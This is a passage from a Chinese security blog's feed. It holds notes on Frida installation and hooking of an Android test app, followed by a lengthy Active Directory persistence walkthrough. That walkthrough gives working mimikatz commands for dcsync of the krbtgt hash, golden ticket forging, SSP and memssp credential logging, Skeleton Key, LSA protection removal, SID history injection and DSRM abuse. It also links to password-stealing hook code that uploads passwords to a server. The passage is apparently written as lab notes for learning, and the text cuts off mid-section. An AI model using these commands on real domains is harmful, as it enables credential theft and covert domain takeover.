AndroidRuntime来查看异常信息跟踪代码。</li></ul><p>总结：获取对象的类类型是Java.use方法，方法有重载的话用overload(…….)解决。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;hook构造方法&quot;&gt;Hook构造方法&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;要hook的是一个类的构造函数&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span c
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-安装配置</title>
    <link href="https://uknowsec.cn/posts/notes/frida-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html"/>
    <id>https://uknowsec.cn/posts/notes/frida-安装配置.html</id>
    <published>2019-12-06T02:35:37.000Z</published>
    <updated>2019-12-06T02:53:39.995Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="frida安装">frida安装</span></h3><h4><span id="frida-12724-frida-tools-530">frida-12.7.24、frida-tools-5.3.0</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida -i https://pypi.douban.com/simple --trusted-host pypi.douban.com</span><br><span class="line">pip install frida-tools -i https://pypi.douban.com/simple --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure><h4><span id="frida-server">frida-server</span></h4><p><a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><h5><span id="虚拟机">虚拟机</span></h5><ul><li><p>frida-server-12.7.24-android-x86  </p></li><li><p>frida-server-12.7.24-android-x86_64</p></li></ul><h5><span id="真机">真机</span></h5><ul><li>frida-server-12.7.24-android-arm</li><li>frida-server-12.7.24-android-arm64</li></ul><h4><span id="andoridkiller">AndoridKiller</span></h4><p>用于查看Android日志、进程、文件等等。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1575527906411.png" alt="1575527906411"></p><h3><span id="frida启动">frida启动</span></h3><h4><span id="启动frida-server">启动frida-server</span></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-12.7.24-android-x86 /data/<span class="built_in">local</span>/tmp/</span><br><span class="line">adb shell</span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod 777 frida-server-12.7.24-android-x86</span><br><span class="line">./frida-server-12.7.24-android-x86</span><br></pre></td></tr></table></figure><h4><span id="启动转发">启动转发</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br></pre></td></tr></table></figure><h4><span id="androidkiller-adb连接">Androidkiller adb连接</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; adb.exe devices</span><br><span class="line">List of devices attached</span><br><span class="line">127.0.0.1:62026 device</span><br><span class="line"></span><br><span class="line">&gt; adb.exe connect 127.0.0.1:62026</span><br><span class="line">adb server version (32) doesn&apos;t match this client (36); killing...</span><br><span class="line">* daemon started successfully *</span><br><span class="line">connected to 127.0.0.1:62026</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1575528331429.png" alt="1575528331429"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1575528424667.png" alt="1575528424667"></p><h3><span id="frida脚本">frida脚本</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import frida</span><br><span class="line"></span><br><span class="line">js_code =&apos;&apos;&apos;</span><br><span class="line">    console.log(&quot;Script loaded successfully &quot;);</span><br><span class="line">    Java.perform(function x() &#123; //Silently fails without the sleep from the python code</span><br><span class="line">    console.log(&quot;Inside java perform function&quot;);</span><br><span class="line">    //get a wrapper for our class</span><br><span class="line">    var my_class = Java.use(&quot;com.example.a11x256.frida_test.my_activity&quot;);</span><br><span class="line">    //replace the original implmenetation of the function `fun` with our custom function</span><br><span class="line">    my_class.fun.implementation = function (x, y) &#123;</span><br><span class="line">        //print the original arguments</span><br><span class="line">        console.log(&quot;original call: fun(&quot; + x + &quot;, &quot; + y + &quot;)&quot;);</span><br><span class="line">        //call the original implementation of `fun` with args (2,5)</span><br><span class="line">        var ret_value = this.fun(2, 5);</span><br><span class="line">        return ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">device = frida.get_remote_device()</span><br><span class="line">pid = device.spawn([&quot;com.example.a11x256.frida_test&quot;])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(1)  # Without it Java.perform silently fails</span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(js_code)</span><br><span class="line">#with open(&quot;s1.js&quot;) as f:</span><br><span class="line">#    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"># prevent the python script from terminating</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><ul><li><p><code>sdevice.spawn([&quot;com.example.a11x256.frida_test&quot;])</code>，要hook的进程包名<code>com.yusakul.myapplication</code>，<code>get_remote_device()</code>获取远程设备，如果是真机usb接入的话，可修改为函数<code>get_usb_device()</code>。</p></li><li><p><code>script = session.create_script(js_code)script.load()</code></p><p>创建加载js脚本。同时也可以通过外部js文件的方式加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;s1.js&quot;) as f:</span><br><span class="line">    script = session.create_script(f.read())</span><br></pre></td></tr></table></figure></li><li><p><code>js_code</code>是hook脚本，为js脚本语言。</p></li></ul><h3><span id="apk-hook源码">apk hook源码</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.a11x256.frida_test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">my_activity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* Access modifiers changed, original: protected */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((<span class="keyword">int</span>) R.layout.activity_my_activity);</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            fun(<span class="number">50</span>, <span class="number">30</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Access modifiers changed, original: 0000 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">"Sum"</span>, String.valueOf(x + y));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此App实现简单的运算，计算50+30并在日志中进行输出。而hook脚本的作用是用于打印原始参数<code>console.log( &quot;original call: fun(&quot;+ x + &quot;, &quot; + y + &quot;)&quot;);</code>。</p><p>并调用原函数，并传参2,5。将函数执行结果返回。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret_value = <span class="keyword">this</span>.fun(<span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> ret_value;</span><br></pre></td></tr></table></figure><h3><span id="运行frida-hook脚本">运行frida hook脚本</span></h3><p>APP正常运行是输出50+30的结果。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1575532370131.png" alt="1575532370131"></p><p>运行hook脚本</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1575533774787.png" alt="1575533774787"></p><p>日志输出为hook脚本的给的参数，并在脚本中输出原始参数值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;frida安装&quot;&gt;frida安装&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;frida-12724-frida-tools-530&quot;&gt;frida-12.7.24、frida-tools-5.3.0&lt;/span&gt;&lt;/h4&gt;&lt;figure clas
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-域维权</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-域维权.html</id>
    <published>2019-09-11T14:17:17.000Z</published>
    <updated>2019-09-11T15:41:19.350Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="黄金票据">黄金票据</span></h3><h4><span id="简介">简介</span></h4><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p><p><strong>制作金票的条件：</strong></p><blockquote><p>1、域名称</p><p>2、域的SID值</p><p>3、域的KRBTGT账户密码HASH </p><p>4、伪造用户名，可以是任意的</p></blockquote><h4><span id="利用过程">利用过程</span></h4><p>金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt</span><br></pre></td></tr></table></figure><p>命令获取krbtgt的值。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542295163.png" alt="1566542295163"></p><p>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>参数说明：</p><blockquote><p>/admin：伪造的用户名</p><p>/domain：域名称</p><p>/sid：SID值，注意是去掉最后一个-后面的值</p><p>/krbtgt：krbtgt的HASH值</p><p>/ticket：生成的票据名称</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543225966.png" alt="1566543225966"></p><p>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::ppt golden.kiribi</span><br><span class="line">kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566542805439.png" alt="1566542805439"></p><p>此时就可以通过dir成功访问域控的共享文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566543260644.png" alt="1566543260644"></p><h3><span id="ssp密码记录">SSP密码记录</span></h3><h4><span id="简介">简介</span></h4><p><strong>SSP：</strong>Security Support Provider，直译为安全支持提供者，又名Security Package.</p><p>简单的理解为SSP就是一个DLL，用来实现身份认证。</p><p><strong>SSPI：</strong>Security Support Provider Interface，直译为安全支持提供程序接口，是Windows系统在执行认证操作所使用的API。</p><p>简单的理解为SSPI是SSP的API接口</p><p><strong>LSA：</strong>Local Security Authority，用于身份认证，常见进程为lsass.exe</p><p>特别的地方在于LSA是可扩展的，在系统启动的时候SSP会被加载到进程lsass.exe中.</p><p>这相当于我们可以自定义一个dll，在系统启动的时候被加载到进程lsass.exe。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568039967810.png" alt="1568039967810"></p><p>如图，这是正常的SSPI结构图，Client APP是我们自定义的dll，通过Secur32.dll可以调用 “<code>credential capture API</code>“来获取LSA的信息</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568041132774.png" alt="1568041132774"></p><p>上图展示了攻击思路，既然可以自定义dll,那么我们就可以定制dll的功能，通过<code>Named Pipe</code>和<code>Shared Memory</code>直接获取<code>lsass.exe</code>中的明文密码，并且能够在其更改密码时立即获得新密码。</p><h4><span id="mimilib-ssp">mimilib SSP</span></h4><p>mimikatz早已支持这个功能，而这个文件就是我们使用的时候常常忽略的mimilib.dll</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568041283216.png" alt="1568041283216"></p><h4><span id="利用过程">利用过程</span></h4><h5><span id="方法一">方法一</span></h5><ol><li><p>添加SSP</p><p>将mimilib.dll复制到域控<code>c:\windows\system32</code>下</p></li></ol><ol><li><p>设置SSP</p><p>修改域控注册表位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568042525270.png" alt="1568042525270"></p></li></ol><p>   3.重启系统</p><p>   域控重启后在<code>c:\windows\system32</code>可看到新生成的文件kiwissp.log</p><p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568084137907.png" alt="1568084137907"></p><h5><span id="方法二使用api-addsecuritypackage">方法二：使用API AddSecurityPackage</span></h5><p>   (1)复制文件</p><p>   同方法1</p><p>   (2)修改注册表</p><p>   同方法1</p><p>   (3)调用AddSecurityPackage</p><p>   测试代码如下：</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   #define SECURITY_WIN32</span><br><span class="line">   </span><br><span class="line">   #include &lt;stdio.h&gt;</span><br><span class="line">   #include &lt;Windows.h&gt;</span><br><span class="line">   #include &lt;Security.h&gt;</span><br><span class="line">   #pragma comment(lib,&quot;Secur32.lib&quot;)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   int main(int argc, char **argv) &#123;</span><br><span class="line">   SECURITY_PACKAGE_OPTIONS option;</span><br><span class="line">   option.Size = sizeof(option);</span><br><span class="line">   option.Flags = 0;</span><br><span class="line">   option.Type = SECPKG_OPTIONS_TYPE_LSA;</span><br><span class="line">   option.SignatureSize = 0;</span><br><span class="line">   option.Signature = NULL;</span><br><span class="line">   SECURITY_STATUS SEC_ENTRYnRet = AddSecurityPackageA(&quot;mimilib&quot;, &amp;option);</span><br><span class="line">   printf(&quot;AddSecurityPackage return with 0x%X\n&quot;, SEC_ENTRYnRet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   添加成功，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会生成文件<code>kiwissp.log</code></p><p>   方法2的自动化实现：</p><p>   <a href="https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/persistence/Install-SSP.ps1</a></p><h5><span id="方法3使用rpc控制lsass加载ssp">方法3：使用RPC控制lsass加载SSP</span></h5><p>   XPN开源的代码：</p><p>   <a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e" target="_blank" rel="noopener">https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e</a></p><p>   测试如下图</p><p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\01598fc92c60f512ae9d.png" alt="111"></p><p>   添加成功</p><p>   优点：</p><ul><li>不需要写注册表</li><li>不调用API AddSecurityPackage</li><li>不需要对lsass进程的内存进行写操作</li><li>lasss进程中不存在加载的dll</li></ul><h4><span id="memory-updating-of-ssps">Memory Updating of SSPs</span></h4><p>   mimikatz同时还支持通过内存更新ssp，这样就不需要重启再获取账户信息</p><p>   需要使用mimikatz.exe，命令如下：</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure><p>   通过修改lsass进程的内存，实现从lsass进程中提取凭据</p><p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568097386864.png" alt="1568097386864"></p><p>   命令执行后，如果此时输入了新的凭据(例如runas，或者用户锁屏后重新登录)，将会在<code>c:\windows\system32</code>下生成文件<code>mimilsa.log</code></p><p>   <img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568097442668.png" alt="1568097442668"></p><h3><span id="skeleton-key">Skeleton Key</span></h3><p>Skeleton Key是一种不需要域控重启即能生效的维持域控权限方法。</p><h4><span id="简介">简介</span></h4><blockquote><p>Skeleton Key被安装在64位的域控服务器上<br>支持Windows Server2003—Windows Server2012 R2<br>能够让所有域用户使用同一个万能密码进行登录<br>现有的所有域用户使用原密码仍能继续登录<br>重启后失效<br>支持 Skeleton Key</p></blockquote><h4><span id="利用过程">利用过程</span></h4><h5><span id="在域控安装skeleton-key">在域控安装Skeleton Key</span></h5><p><strong>mimikatz命令：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568098265598.png" alt="1568098265598"></p><h5><span id="域内主机使用skeleton-key登录域控">域内主机使用Skeleton Key登录域控</span></h5><p>mimikatz的默认Skeleton Key设置为mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\OWA2010SP3.0day.org mimikatz /user:administrator@0day.org</span><br><span class="line">dir \\OWA2010SP3.0day.org\c$</span><br></pre></td></tr></table></figure><p> Skeleton Key只是给所有账户添加了一个万能密码，无法修改账户的权限</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568099168617.png" alt="1568099168617"></p><h5><span id="绕过lsa-protection">绕过LSA Protection</span></h5><p><strong>配置LSA Protection</strong></p><p>注册表位置：<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code></p><p>新建-<code>DWORD</code>值，名称为<code>RunAsPPL</code>,数值为<code>00000001</code></p><p>重启系统</p><p><strong>使用mimidrv.sys绕过</strong></p><p><strong>mimikatz命令：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><strong>绕过cmd、regedit、taskmgr</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure><h3><span id="hook-passwordchangenotify">Hook PasswordChangeNotify</span></h3><h4><span id="简介">简介</span></h4><p>Hook PasswordChangeNotify这个概念最早是在2013年9月15日由clymb3r提出，通过Hook PasswordChangeNotify拦截修改的帐户密码。</p><p>需要了解的相关背景知识如下：</p><ol><li><p>在修改域控密码时会进行如下同步操作：</p><p>a. 当修改域控密码时，LSA首先调用PasswordFileter来判断新密码是否符合密码复杂度要求</p><p>b. 如果符合，LSA接着调用PasswordChangeNotify在系统上同步更新密码</p></li><li><p>函数PasswordChangeNotify存在于rassfm.dll</p></li><li><p>rassfm.dll可理解为Remote Access Subauthentication dll，只存在于在Server系统下，xp、win7、win8等均不存在</p></li></ol><p>Hook PasswordChangeNotify有如下优点：</p><ol><li>不需要重启</li><li>不需要修改注册表</li><li>甚至不需要在系统放置dll</li></ol><h4><span id="利用过程">利用过程</span></h4><p>实现Hook PasswordChangeNotify共包含两部分：Hook dll和dll注入。</p><p><a href="https://github.com/3gstudent/Hook-PasswordChangeNotify" target="_blank" rel="noopener">https://github.com/3gstudent/Hook-PasswordChangeNotify</a></p><p>编译工程，生成HookPasswordChange.dll</p><p>MFC设置为在静态库中使用MFC</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568103854190.png" alt="1568103854190"></p><p>上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll到域控主机</p><p>管理员权限执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568104973054.png" alt="1568104973054"></p><p>手动修改域控密码后<br>在C:\Windows\Temp下可以找到passwords.txt，其中记录了新修改的密码。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568105156124.png" alt="1568105156124"></p><p>自定义dll代码实现更多高级功能，如自动上传新密码。</p><p>以下链接中的代码可作为参考，其中实现了将获取的新密码上传至Http服务器</p><p><a href="http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html" target="_blank" rel="noopener">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</a></p><h3><span id="dsrm同步指定域用户">DSRM同步指定域用户</span></h3><h4><span id="dsrm密码同步">DSRM密码同步</span></h4><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。</p><p>利用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil</span><br><span class="line">ntdsutil: set DSRM password</span><br><span class="line">Reset DSRM Administrator Password: SYNC FROM DOMAIN ACCOUNT test</span><br><span class="line">Password has been synchronized successfully.</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118352518.png" alt="1568118352518"></p><p>同步之后使用mimikatz查看test用户和SAM中Administrator的NTLM值。如下图所示，可以看到两个账户的NTLM值相同，说明确实同步成功了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /name:test /inject</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118643769.png" alt="1568118643769"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568118740466.png" alt="1568118740466"></p><h4><span id="修改注册表允许dsrm账户远程访问">修改注册表允许DSRM账户远程访问</span></h4><p>修改注册表 <code>HKLM\System\CurrentControlSet\Control\Lsa 路径下的 DSRMAdminLogonBehavior</code> 的值为2。</p><p>PS：系统默认不存在<code>DSRMAdminLogonBehavior</code>，手动添加。</p><p>DSRM账户是域控的本地管理员账户，并非域的管理员帐户。所以DSRM密码同步之后并不会影响域的管理员帐户。另外，在下一次进行DSRM密码同步之前，NTLM的值一直有效。所以为了保证权限的持久化，尤其在跨国域或上百上千个域的大型内网中，最好在事件查看器的安全事件中筛选事件ID为4794的事件日志，来判断域管是否经常进行DSRM密码同步操作。</p><h3><span id="sid-history">SID history</span></h3><p>SID history是支持迁移方案的属性。每个用户帐户都有一个关联的安全标识符（SID），用于跟踪安全主体和连接到资源时的帐户及访问权限。SID历史记录允许另一个帐户的访问被有效的克隆到另一个帐户。这是非常有用的，其目的是确保用户在从一个域移动（迁移）到另一个域时能保留原有的访问权限。由于在创建新帐户时用户的SID会发生更改，旧的SID需要映射到新的帐户。当域A中的用户迁移到域B时，将在DomainB中创建新的用户帐户，并将DomainA用户的SID添加到DomainB的用户帐户的SID历史记录属性中。这样就可以确保DomainB用户仍可以访问DomainA中的资源。</p><p>Mimikatz支持SID历史注入到任何用户帐户（需要域管理员或等效的权限）。在这种情况下，攻击者创建用户帐户“test”，并将该域的默认管理员帐户“Administrator”（RID 500）添加到帐户的SID历史记录属性中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::add /new:[DomainAdmin&apos;s SID or NAME] /sam:[CommonUserNAME]</span><br></pre></td></tr></table></figure><p>当test登录时，将对与该帐户相关联的SID进行评估，并根据这些SID来确定访问权限。由于test帐户与Administrator帐户（RID 500）相关联，因此，test帐户具有Administrator帐户的所有访问权限，包括域管理员权限。</p><h3><span id="gpo组策略后门">GPO[组策略]后门</span></h3><h4><span id="利用sysvol还原组策略中保存的密码">利用SYSVOL还原组策略中保存的密码</span></h4><p>使用Group Policy Preferences配置组策略批量修改用户本地管理员密码。</p><p>开始-管理工具-组策略管理</p><p>选择域，创建GP0</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190482125.png" alt="1568190482125"></p><p>设置名称为test</p><p>test-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190567581.png" alt="1568190567581"></p><p>更新，administrator(内置),设置密码</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190624962.png" alt="1568190624962"></p><p>委派，设置权限</p><p>在详细一栏，可看到该策略对应的ID为<code>{05F24259-49D8-481A-8408-567DC3155838}</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568190671139.png" 